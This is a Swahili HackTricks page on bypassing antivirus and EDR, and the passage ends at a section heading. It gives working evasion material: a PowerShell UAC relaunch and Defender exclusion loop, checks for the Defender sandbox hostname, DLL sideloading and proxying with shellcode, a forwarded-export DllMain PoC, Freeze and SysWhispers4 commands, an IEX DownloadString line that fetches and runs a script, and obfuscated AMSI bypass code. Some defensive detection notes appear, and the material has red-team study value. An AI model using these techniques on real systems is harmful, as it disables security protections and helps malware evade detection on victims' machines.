# Kupita Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Kusimamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Zana ya kuzuia Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Zana ya kuzuia Windows Defender kufanya kazi kwa kujifanya AV nyingine.
- [Kuzima Defender ikiwa wewe ni admin](basic-powershell-for-pentesters/README.md)

### Kichocheo cha UAC cha mtindo wa installer kabla ya kuingilia Defender

Loaders za umma zinazojifanya cheats za michezo mara nyingi husambazwa kama installers za Node.js/Nexe zisizosainiwa, ambazo kwanza **humwomba mtumiaji ruhusa za juu** na kisha kuzima Defender. Mchakato ni rahisi:

1. Kagua kama kuna muktadha wa kiutawala kwa kutumia `net session`. Amri hii hufanikiwa tu wakati mtumiaji anayeiendesha ana haki za admin, kwa hivyo ikishindwa inaashiria kuwa loader inaendeshwa na mtumiaji wa kawaida.
2. Ianzishe tena mara moja kwa kutumia kitenzi cha `RunAs` ili kuonyesha kidokezo cha kawaida cha idhini ya UAC huku ikihifadhi mstari wa amri wa awali.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Waathiriwa tayari wanaamini kuwa wanasakinisha software “cracked”, kwa hivyo kwa kawaida wanakubali kidokezo hicho, na hivyo kuipa malware ruhusa zinazohitajika kubadilisha sera ya Defender.<sup>[[26]](#references)</sup>

### Exclusions za `MpPreference` kwa kila herufi ya kiendeshi

Baada ya kupata ruhusa za juu, minyororo ya aina ya GachiLoader huongeza maeneo yasiyoonekana na Defender badala ya kuzima huduma moja kwa moja. Kwanza, loader husimamisha GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), kisha huweka **exclusions pana kupita kiasi** ili kila wasifu wa mtumiaji, saraka ya mfumo na diski inayoweza kuondolewa isiweze kuchanganuliwa:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Uchunguzi muhimu:

- Mzunguko huu hupitia kila filesystem iliyowekwa (D:\, E:\, USB sticks, n.k.), kwa hiyo **payload yoyote itakayowekwa mahali popote kwenye diski baadaye itapuuzwa**.
- Kutenga kiendelezi `.sys` ni hatua ya mbele—washambuliaji wanahifadhi chaguo la kupakia drivers ambazo hazijasainiwa baadaye bila kuigusa Defender tena.
- Mabadiliko yote hufanywa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo hatua za baadaye zinaweza kuthibitisha kuwa exclusions zimehifadhiwa au kuzipanua bila kusababisha UAC tena.

Kwa kuwa hakuna huduma ya Defender inayozimwa, ukaguzi rahisi wa afya ya mfumo bado huripoti “antivirus active”, ingawa ukaguzi wa wakati halisi haugusi tena njia hizo.<sup>[[26]](#references)</sup>

## **Mbinu za AV Evasion**

Kwa sasa, AV hutumia mbinu tofauti kubaini kama faili ni hasidi au la: static detection, dynamic analysis, na kwa EDR za hali ya juu zaidi, behavioural analysis.

### **Static detection**

Static detection hufanywa kwa kutambua mifuatano hasidi inayojulikana au safu za bytes ndani ya binary au script, na pia kutoa taarifa kutoka kwenye faili yenyewe (kwa mfano, maelezo ya faili, jina la kampuni, digital signatures, icon, checksum, n.k.). Hii inamaanisha kuwa kutumia zana za umma zinazojulikana kunaweza kukufanya ugundulike kwa urahisi zaidi, kwa kuwa huenda tayari zimechambuliwa na kubainishwa kuwa hasidi. Kuna njia kadhaa za kukwepa aina hii ya ugunduzi:

- **Encryption**

Ukisimba binary kwa njia fiche, AV haitaweza kugundua programu yako, lakini utahitaji aina fulani ya loader ili kuifungua na kuiendesha kwenye memory.

- **Obfuscation**

Wakati mwingine unachohitaji ni kubadilisha baadhi ya strings kwenye binary au script yako ili ipite AV, lakini hili linaweza kuchukua muda kulingana na unachojaribu kuficha.

- **Zana maalum**

Ukitengeneza zana zako mwenyewe, hakutakuwa na signatures zinazojulikana kuwa hasidi, lakini hili linahitaji muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya kupima dhidi ya static detection ya Windows Defender ni kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi, hugawa faili katika segments nyingi kisha huiomba Defender ichanganue kila segment kivyake. Kwa njia hii, inaweza kukuonyesha hasa strings au bytes zilizobainishwa ndani ya binary yako.

Ninapendekeza sana uangalie [orodha hii ya video za YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion ya vitendo.

### Vipimo vya offline vya vipengele vya PE kwa static classifiers

Bytes za payload zilizopakiwa au kusimbwa kwa njia fiche ni ingizo moja tu kati ya mengi yanayotumiwa na static classifier. EMBER2024 hutoa vipengele vya PE, vikiwemo imports, exports, sections, headers, na data ya Authenticode.<sup>[[48]](#references)</sup> Katika jaribio moja la loader, kuongeza imports 141 zinazoonekana kuwa zisizo na madhara kulipunguza alama ya uhasidi ya EMBER2024 kwa 93%, huku imports zinazohusishwa na malware zikiiongeza. Haya ni matokeo ya model hiyo na samples hizo, si njia ya kuaminika ya kukwepa bidhaa fulani ya AV/EDR.<sup>[[50]](#references)</sup>

Kwa jaribio la loader lililoidhinishwa, acha payload na njia ya utekelezaji vilevile, badilisha variable moja tu ya build iliyokusudiwa kwa kila variant, kisha linganisha alama ukiwa offline. Kagua vipengele vya PE vilivyotokana na mabadiliko hayo, kwa kuwa mabadiliko ya build yanaweza kuathiri zaidi ya kundi moja la vipengele.<sup>[[49]](#references)[[50]](#references)</sup> Ili imports zilizokusudiwa zibaki kwenye IAT, ita Win32 APIs ulizochagua kutoka kwenye code inayoweza kufikiwa. Badilisha uteuzi na sambaza maeneo ya calls kati ya builds badala ya kuunda camouflage function isiyobadilika ambayo inaweza kuwa signature. Jaribio hilo pia liliripoti alama za chini kwa code signing halali, export entries, na functions nyingi zaidi zinazopanua `.pdata`; signing batili haikuwa na athari kubwa, na athari ya `.pdata` ilikuwa ndogo.<sup>[[50]](#references)</sup>

Package ya `thrember` hutoa uchimbaji wa vipengele na benchmark models. Baada ya kuisakinisha, tumia `thrember.download_models("models")` ukiwa na directory ya `models` iliyopo, kisha endesha scorer kutoka directory ya mzazi: helper ya upakuaji hubadilisha working directory ya sasa. PE classifier inaweza kukokotoa alama za directory yenye builds bila kuzituma kwenye huduma ya scanning:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Weka matoleo ya model na feature-extractor bila kuyabadilisha wakati wa kulinganisha. Alama ya chini ya offline inaonyesha tu jinsi classifier hii inavyoitikia binary iliyobadilishwa; haithibitishi kukwepa behavioral analysis, emulation, au model tofauti ya vendor.<sup>[[49]](#references)[[50]](#references)</sup> Kwa [per-build polymorphism na outer-binary camouflage katika virtualized payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), angalia execution model tofauti.

### **Dynamic analysis**

Dynamic analysis ni pale AV inapozindua binary yako kwenye sandbox na kufuatilia shughuli hasidi (kwa mfano, kujaribu kusimbua na kusoma nywila za browser yako, kufanya minidump ya LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kushughulikia, lakini haya ni baadhi ya mambo unayoweza kufanya ili kukwepa sandboxes.

- **Lala kabla ya kutekeleza** Kulingana na jinsi ilivyotekelezwa, hii inaweza kuwa njia nzuri ya kukwepa dynamic analysis ya AV. AV zina muda mfupi sana wa kuchanganua faili ili zisiingilie mtiririko wa kazi wa mtumiaji, kwa hiyo kutumia muda mrefu wa kusubiri kunaweza kuvuruga uchanganuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kuruka muda huo wa kusubiri, kutegemea jinsi ulivyotekelezwa.
- **Kukagua rasilimali za mashine** Kwa kawaida Sandboxes huwa na rasilimali chache sana za kutumia (kwa mfano, < 2GB RAM); vinginevyo zinaweza kupunguza kasi ya mashine ya mtumiaji. Unaweza pia kuwa mbunifu sana hapa, kwa mfano kwa kukagua halijoto ya CPU au hata kasi ya feni; si kila kitu kitakuwa kimetekelezwa kwenye sandbox.
- **Ukaguzi maalum kwa mashine** Ikiwa unataka kulenga mtumiaji ambaye workstation yake imeunganishwa kwenye domain ya "contoso.local", unaweza kukagua domain ya kompyuta ili kuona kama inalingana na uliyobainisha. Ikiwa hailingani, unaweza kufanya programu yako itoke.

Imebainika kuwa jina la kompyuta la Microsoft Defender's Sandbox ni HAL9TH. Kwa hiyo, unaweza kukagua jina la kompyuta kwenye malware yako kabla ya detonation. Jina likiwa HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kufanya programu yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Vidokezo vingine vizuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) vya kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> chaneli ya #malware-dev</p></figcaption></figure>

Kama tulivyosema awali kwenye chapisho hili, **public tools** hatimaye **zitagunduliwa**, kwa hiyo unapaswa kujiuliza jambo moja:

Kwa mfano, ikiwa unataka kudump LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia project nyingine isiyojulikana sana ambayo pia hudump LSASS?

Jibu sahihi huenda ni la pili. Tukichukulia mimikatz kama mfano, huenda ni mojawapo ya malware zinazowekwa alama nyingi zaidi na AV na EDR, ikiwa siyo iliyo juu kabisa. Ingawa project yenyewe ni nzuri sana, pia ni jinamizi kujaribu kuifanya ipite AV. Kwa hiyo, tafuta tu njia mbadala za kutimiza unachojaribu kufanya.

> [!TIP]
> Unaporekebisha payloads zako ili kukwepa detection, hakikisha **unazima automatic sample submission** kwenye Defender, na tafadhali, kwa dhati, **USIPAKIE KWENYE VIRUSTOTAL** ikiwa lengo lako ni kufanikisha evasion kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inagunduliwa na AV fulani, isakinishe kwenye VM, jaribu kuzima automatic sample submission, kisha ifanyie majaribio humo hadi uridhike na matokeo.

## EXEs vs DLLs

Inapowezekana, **pa kipaumbele kutumia DLLs kwa evasion**. Kulingana na uzoefu wangu, faili za DLL kwa kawaida **hugunduliwa na kuchanganuliwa kwa kiwango cha chini zaidi**, kwa hiyo hii ni mbinu rahisi sana ya kuepuka detection katika baadhi ya hali (ikiwa payload yako inaweza kufanya kazi kama DLL, bila shaka).

Kama tunavyoona kwenye picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 kwenye antiscan.me, huku EXE payload ikiwa na detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>ulinganisho wa antiscan.me wa Havoc EXE payload ya kawaida na Havoc DLL ya kawaida</p></figcaption></figure>

Sasa tutaonyesha mbinu kadhaa unazoweza kutumia na faili za DLL ili ziwe fiche zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia mpangilio wa utafutaji wa DLL unaotumiwa na loader kwa kuweka application ya mwathiriwa na payload(s) hasidi pamoja.

Unaweza kutafuta programu zilizo katika hatari ya DLL Sideloading ukitumia [Siofra](https://github.com/Cybereason/siofra) na script ifuatayo ya powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Amri hii itaonyesha orodha ya programu zilizo hatarini kwa DLL hijacking ndani ya "C:\Program Files\\" pamoja na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **uchunguze mwenyewe programu zinazoweza kufanyiwa DLL Hijacking/Sideloading**. Mbinu hii ni fiche sana ikitekelezwa ipasavyo, lakini ukitumia programu za DLL Sideloading zinazojulikana hadharani, unaweza kugundulika kwa urahisi.

Kuweka tu DLL hasidi yenye jina ambalo programu inatarajia kupakia hakutapakia payload yako, kwa sababu programu inatarajia baadhi ya functions mahususi ndani ya DLL hiyo. Ili kutatua tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** huelekeza calls ambazo programu hufanya kutoka kwenye proxy DLL (hasidi) kwenda kwenye DLL asili. Hivyo, utendaji wa programu huhifadhiwa na payload yako inaweza kutekelezwa.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Amri ya mwisho itatupa faili 2: kiolezo cha msimbo chanzo wa DLL, na DLL ya awali iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Matokeo haya:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyosimbwa kwa [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zote zina Detection rate ya 0/26 kwenye [antiscan.me](https://antiscan.me)! Naweza kusema hili limefanikiwa.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninapendekeza sana** utazame [video ya S3cur3Th1sSh1t kwenye Twitch](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu tulichojadili kwa kina.

### Kutumia vibaya Forwarded Exports (ForwardSideLoading)

Moduli za Windows PE zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuelekeza kwenye code, ingizo la export huwa na mfuatano wa ASCII wa aina ya `TargetDll.TargetFunc`. Caller inapotatua export hiyo, Windows loader itafanya yafuatayo:

- Itapakia `TargetDll` ikiwa bado haijapakiwa
- Itatatua `TargetFunc` kutoka humo

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwenye namespace iliyolindwa ya KnownDLLs (kwa mfano, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ikiwa `TargetDll` si KnownDLL, hutumika mpangilio wa kawaida wa kutafuta DLL, unaojumuisha saraka ya moduli inayofanya forward resolution.

Hii inawezesha mbinu ya indirect sideloading: tafuta DLL iliyosainiwa inayo-export function iliyoelekezwa kwenye jina la moduli isiyo KnownDLL, kisha iweke pamoja na DLL inayodhibitiwa na mshambuliaji na iliyopewa jina sawa kabisa na moduli inayolengwa na forward. Forwarded export inapotumiwa, loader hutatua forward hiyo na kupakia DLL yako kutoka saraka hiyo hiyo, na kutekeleza DllMain yako.<sup>[[13]](#references)</sup>

Mfano ulioonekana kwenye Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` si KnownDLL, kwa hiyo hupatikana kupitia mpangilio wa kawaida wa utafutaji.

PoC (nakili-bandika):
1) Nakili DLL ya mfumo iliyosainiwa kwenye folda inayoweza kuandikika
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi kwenye folda hiyo hiyo. DllMain ndogo inatosha kutekeleza msimbo; huhitaji kutekeleza forwarded function ili kuanzisha DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Anzisha usambazaji kwa kutumia LOLBin iliyotiwa saini:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Tabia iliyozingatiwa:
- rundll32 (signed) hupakia `keyiso.dll` ya side-by-side (signed)
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader hufuata forward kuelekea `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" baada tu ya `DllMain` kuwa tayari imetekelezwa

Vidokezo vya kutafuta:
- Lenga forwarded exports ambazo module lengwa si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa kutumia zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Angalia orodha ya Windows 11 forwarder ili kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Mawazo ya ugunduzi/ulinzi:
- Fuatilia LOLBins (kwa mfano, rundll32.exe) zinazopakia DLL zilizotiwa sahihi kutoka kwenye njia zisizo za mfumo, kisha kupakia non-KnownDLLs zenye jina lilelile la msingi kutoka kwenye saraka hiyo
- Toa tahadhari kuhusu minyororo ya michakato/moduli kama: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` ndani ya njia zinazoweza kuandikwa na mtumiaji
- Tekeleza sera za code integrity (WDAC/AppLocker) na kataza ruhusa za kuandika na kutekeleza katika saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni zana ya payload ya kukwepa EDR kwa kutumia michakato iliyosimamishwa, direct syscalls na mbinu mbadala za utekelezaji`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu; kinachofanya kazi leo kinaweza kutambuliwa kesho, kwa hivyo usitegemee zana moja pekee. Ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls na Utatuzi wa SSN (SysWhispers4)

EDR mara nyingi huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kukwepa hooks hizo, unaweza kutengeneza syscall stubs za **direct** au **indirect** zinazopakia **SSN** (System Service Number) sahihi na kuingia kernel mode bila kutekeleza export entrypoint iliyowekewa hook.<sup>[[32]](#references)</sup>

**Chaguo za kuita:**
- **Direct (embedded)**: weka agizo la `syscall`/`sysenter`/`SVC #0` kwenye stub iliyotengenezwa (hakuna kugusa export ya `ntdll`).
- **Indirect**: ruka hadi kwenye gadget ya `syscall` iliyopo ndani ya `ntdll` ili mpito wa kernel uonekane kana kwamba umetoka `ntdll` (ni muhimu kwa evasion ya heuristic); **randomized indirect** huchagua gadget kutoka kwenye kundi kwa kila mwito.
- **Egg-hunt**: epuka kuweka mfuatano tuli wa opcode `0F 05` kwenye diski; tafuta mfuatano wa syscall wakati wa runtime.

**Mikakati ya utatuzi wa SSN inayostahimili hooks:**
- **FreshyCalls (VA sort)**: kadiria SSN kwa kupanga syscall stubs kulingana na anwani zao za virtual badala ya kusoma baiti za stub.
- **SyscallsFromDisk**: weka ramani ya `\KnownDlls\ntdll.dll` safi, soma SSN kutoka kwenye `.text` yake, kisha ondoa ramani (hii hukwepa hooks zote zilizo kwenye kumbukumbu).
- **RecycledGate**: changanya makadirio ya SSN kwa mpangilio wa VA na uthibitishaji wa opcode wakati stub iko safi; tumia makadirio ya VA ikiwa imewekewa hook.
- **HW Breakpoint**: weka DR0 kwenye agizo la `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati wa runtime, bila kuchanganua baiti zilizowekewa hook.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Unapochanganua exports safi za x64 `ntdll` za syscall ili kupata SSN, ruhusu `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) na mfuatano huo huo ukitanguliwa na `F3 0F 1E FA` (`endbr64`). Hii ya pili ni stub yenye kiambishi awali cha CET: parser inayodhani kuwa SSN huwa kwenye offset moja maalumu haitaitambua. Ikiwa uanzishaji wa indirect-syscall utashindwa na loader ikatumia `GetProcAddress` badala yake, miito kupitia exports hizo inaweza tena kukutana na user-mode hooks.<sup>[[54]](#references)</sup>

## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Hapo awali, AV ziliweza kuchanganua **files on disk** pekee, kwa hiyo ukiweza kwa namna fulani kutekeleza payloads **directly in-memory**, AV haingeweza kufanya chochote kuizuia, kwa kuwa isingekuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeunganishwa katika vipengele hivi vya Windows.

- User Account Control, au UAC (uinuaji wa ruhusa wa usakinishaji wa EXE, COM, MSI, au ActiveX)
- PowerShell (scripts, matumizi shirikishi, na tathmini ya dynamic code)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Office VBA macros

Huruhusu suluhisho za antivirus kukagua tabia ya script kwa kuweka maudhui ya script wazi, bila usimbaji fiche wala kufichwa.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha tahadhari ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoongeza `amsi:` mwanzoni, kisha njia ya executable ambayo script iliendeshwa kutoka humo, katika hali hii, powershell.exe

Hatukuandika faili yoyote kwenye diski, lakini bado tulinaswa ikiwa kwenye memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, C# code pia hupitishwa kupitia AMSI. Hili huathiri hata `Assembly.Load(byte[])` inayotumika kupakia utekelezaji wa ndani ya memory. Ndiyo maana kutumia matoleo ya chini ya .NET (kama 4.7.2 au ya chini) kunapendekezwa kwa utekelezaji wa ndani ya memory ikiwa unataka kukwepa AMSI.

Kuna njia kadhaa za kukwepa AMSI:

- **Obfuscation**

Kwa kuwa AMSI hufanya kazi hasa kwa kutumia utambuzi tuli, kurekebisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya kukwepa utambuzi.

Hata hivyo, AMSI inaweza kufichua scripts zilizofichwa hata zikiwa na tabaka nyingi, kwa hiyo obfuscation inaweza isiwe chaguo zuri kutegemea jinsi inavyofanywa. Hii hufanya kukwepa isiwe jambo rahisi moja kwa moja. Ingawa wakati mwingine unachohitaji ni kubadilisha majina kadhaa ya variables na utakuwa sawa; kwa hiyo inategemea kiwango ambacho kitu kimewekewa alama.

- **AMSI Bypass**

Kwa kuwa AMSI hutekelezwa kwa kupakia DLL kwenye mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuichezea kwa urahisi hata ukiwa mtumiaji asiye na privileged access. Kwa sababu ya dosari hii katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kukwepa uchanganuzi wa AMSI.

**Kulazimisha Hitilafu**

Kulazimisha uanzishaji wa AMSI ushindwe (amsiInitFailed) kutasababisha uchanganuzi usianzishwe kwa mchakato wa sasa. Hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imetengeneza signature ili kuzuia matumizi yake kuenea zaidi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Kinachohitajika tu ni mstari mmoja wa code ya powershell ili kufanya AMSI isiweze kutumika katika mchakato wa sasa wa powershell. Bila shaka, mstari huu umegunduliwa na AMSI yenyewe, kwa hivyo unahitaji kufanyiwa marekebisho ili kutumia mbinu hii.

Hii hapa ni AMSI bypass iliyorekebishwa niliyoipata kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Kumbuka kwamba huenda hili litawekewa alama chapisho hili litakapotolewa, kwa hiyo usichapishe code yoyote ikiwa mpango wako ni kutotambuliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuchanganua ingizo lililotolewa na mtumiaji) na kuibadilisha kwa maelekezo ya kurudisha code ya E_INVALIDARG. Kwa njia hii, matokeo ya uchanganuzi halisi hurudisha 0, ambayo hutafsiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo zaidi.

Pia kuna mbinu nyingine nyingi zinazotumika kukwepa AMSI kwa powershell; angalia [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Kuelekeza upya AMSI COM scan-pointer badala ya kufanya patching ya `AmsiScanBuffer`

Mbinu nyingine ya kukwepa inayohusu mchakato husika huacha entry point ya `AmsiScanBuffer` bila kuigusa. Katika .NET loader ya 64-bit iliyoripotiwa, object ya AMSI COM huundwa kutoka CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` hutoa pointer ya interface, na slot yake ya vtable iliyo kwenye offset `0x18` hutumika kama lengo la mwito wa scan. Loader hufanya patching ya pointer asilia ya `Console.Clear()` kwa kutumia stub ndogo ya x64, hubadilisha ingizo hilo la vtable kuwa stub hiyo kwa kutumia `VirtualProtect()`, kisha hurejesha ulinzi wa awali wa ukurasa. Upana wa pointer wa 64-bit na mpangilio wa COM unaotarajiwa ni masharti ya lazima; hii si offset ya jumla inayofaa kwa interfaces au builds za AMSI kiholela. Hatua za awali zilizozingatiwa ni [upakiaji wa sidecar ya signed AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) na [deserialization ya RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Byte za stub zilizoonekana ni `41 C7 00 01 00 00 00 33 C0 C3`: huandika **1** kwenye pointer ya matokeo katika `r8` na kurudisha **0** katika `eax`. Kwa hiyo, dai lililoripotiwa kwamba matokeo ya scan ni `AMSI_RESULT_CLEAN` (0) linachanganya thamani ya kurudi ya `S_OK` na enum ya matokeo. Katika mpangilio ulioandikwa wa `AMSI_RESULT`, matokeo **1** ni `AMSI_RESULT_NOT_DETECTED`; bado yako chini ya kizingiti cha ugunduzi.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Kuzuia AMSI kwa kuzuia amsi.dll kupakiwa (LdrLoadDll hook)

